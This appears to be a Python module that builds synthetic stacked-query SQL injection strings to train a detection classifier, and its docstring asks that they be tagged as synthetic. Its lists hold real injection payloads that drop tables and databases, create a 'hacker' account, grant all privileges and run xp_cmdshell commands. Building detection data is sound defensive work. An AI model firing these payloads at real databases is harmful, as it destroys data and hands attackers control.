"""Synthetic generator for the `stacked` label.

No public source we checked (D1 SQLiV3, D4 payload-box, D7 SR-BH 2020) has a
single real ``; DROP TABLE``-style stacked-query example (verified counts in
data_contract.md). This module generates a modest synthetic batch so the
class has *some* training signal. Output rows must be tagged
``source="synthetic_stacked"`` and disclosed as synthetic in the report.
"""

from __future__ import annotations

import itertools

_PREFIXES = [
    "1",
    "'1'",
    "1'",
    "admin",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "SELECT * FROM users WHERE id=1",
    "' AND 1=1",
    "1)",
    "')",
    "0",
]

_SECOND_STATEMENTS = [
    "DROP TABLE users",
    "DROP TABLE customers",
    "DROP DATABASE test",
    "TRUNCATE TABLE users",
    "INSERT INTO users(username,password) VALUES('hacker','pwned')",
    "UPDATE users SET password='pwned' WHERE username='admin'",
    "DELETE FROM logs",
    "CREATE USER hacker IDENTIFIED BY 'pwned'",
    "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
    "EXEC xp_cmdshell('whoami')",
    "EXEC master..xp_cmdshell 'ping 10.0.0.1'",
]

_TERMINATORS = ["--", "#", ""]


def generate_synthetic_stacked(limit: int | None = None) -> list[str]:
    """Generate synthetic stacked-query payloads by combining templates.

    Args:
        limit: Optional cap on the number of payloads returned. If ``None``,
            returns the full cartesian product.

    Returns:
        List of synthetic payload strings of the form
        ``"{prefix}; {second_statement}{terminator}"``.
    """
    payloads = [
        f"{prefix}; {stmt}{term}"
        for prefix, stmt, term in itertools.product(_PREFIXES, _SECOND_STATEMENTS, _TERMINATORS)
    ]
    if limit is not None:
        payloads = payloads[:limit]
    return payloads
